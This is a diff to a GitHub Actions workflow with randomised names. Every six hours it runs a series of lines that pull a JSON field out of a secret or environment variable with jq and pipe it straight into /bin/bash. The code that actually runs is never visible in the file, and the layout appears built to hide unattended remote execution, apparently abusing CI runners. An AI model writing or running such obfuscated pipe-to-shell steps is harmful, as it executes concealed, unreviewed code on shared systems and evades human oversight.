@@ -1,9 +1,9 @@
 name: minidisctransire
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 3/6 * * *'
-
+    - cron: '7 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,18 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: minidisctransire
         env:
-          obkj906: ${{ secrets.obkj906 }}
+          lzfan834: ${{ secrets.lzfan834 }}
         run: |
-          echo $obkj906 | jq -r .s4 | /bin/bash
-          echo $mai7 | jq -r .m80 | /bin/bash
-          echo $so9467 | jq -r .eyhlb3 | /bin/bash
-          echo $hiwt47 | jq -r .mfpz76173 | /bin/bash
-          echo $zcaan40571 | jq -r .ju6533 | /bin/bash
-          echo $pnhd84 | jq -r .ymz120 | /bin/bash
-          echo $dl4 | jq -r .unm672 | /bin/bash
-          echo $t93 | jq -r .adu85528 | /bin/bash
-          echo $j17304 | jq -r .iqaa63525 | /bin/bash
-          echo $ywghp4555 | jq -r .qkyg0 | /bin/bash
-          echo $liwwx32141 | jq -r .keyk184 | /bin/bash
-          echo $ijjqs4696 | jq -r .mdecc95640 | /bin/bash
+          echo $lzfan834 | jq -r .utry389 | /bin/bash
+          echo $v8261 | jq -r .bula37 | /bin/bash
+          echo $odaxa3 | jq -r .chi11738 | /bin/bash
+          echo $tbpg6903 | jq -r .andqh152 | /bin/bash
+          echo $eix65 | jq -r .bw195 | /bin/bash
+          echo $evob323 | jq -r .wu06 | /bin/bash
+          echo $jjvtr58 | jq -r .ijy0347 | /bin/bash
 
